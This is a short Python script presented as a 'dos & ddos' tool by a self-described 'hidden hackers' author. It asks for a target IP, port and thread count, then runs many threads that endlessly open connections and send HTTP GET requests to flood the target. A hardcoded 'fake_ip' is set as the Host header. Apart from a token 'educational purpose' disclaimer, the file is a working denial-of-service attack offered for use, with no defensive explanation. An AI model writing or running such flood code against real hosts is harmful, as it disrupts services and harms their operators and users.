# welcom to hidden hackers (harshaD3) dos & ddos in python script....!

# It is a very dangerous tool be careful while using this tool.....!

# Used only for educational purpose and we are not encouraging any illegal things....!

import socket
import threading

target = input("Insert target’s IP: ")
port = int(input("Insert Port: "))
num_threads = int(input("Insert number of Threads: "))
fake_ip = '44.197.175.168'
attack_num = 0

def attack():
    global attack_num
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.send(f"GET /{target} HTTP/1.1\r\n".encode('utf-8'))
            s.send(f"Host: {fake_ip}\r\n\r\n".encode('utf-8'))
            s.close()
            attack_num += 1
            print(f"Attack number: {attack_num}")
        except Exception as e:
            print(f"Error: {e}")

# Create threads
threads = []
for _ in range(num_threads):
    thread = threading.Thread(target=attack)
    thread.start()
    threads.append(thread)

# Wait for all threads to finish
for thread in threads:
    thread.join()
    
# tool developed by @(haesha vaedha raju yerra)...!